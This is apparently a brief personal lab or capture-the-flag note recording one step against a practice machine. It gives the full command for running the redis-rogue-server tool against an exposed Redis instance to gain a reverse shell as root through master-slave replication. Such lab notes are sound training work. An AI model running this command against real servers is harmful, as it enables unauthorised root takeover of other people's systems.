#box

*Created: 1/10/2026*

### Step 1

**Tags:** #Redis #redis-rogue-server

**Command:**
```bash
python3 redis-rogue-server.py --rhost 192.168.200.69 --rport 6379 --lhost 192.168.45.213 --lport 6379
```

*Port: 6379*

> 
> This machine shows an open instance of Redis which is vulnerable to a Master-Slave Replication attack. It's possible to get a shell with the usage of [redis-rogue-server](https://github.com/Dliv3/redis-rogue-server). Gaining a reverse shell will give us a shell as root.

---

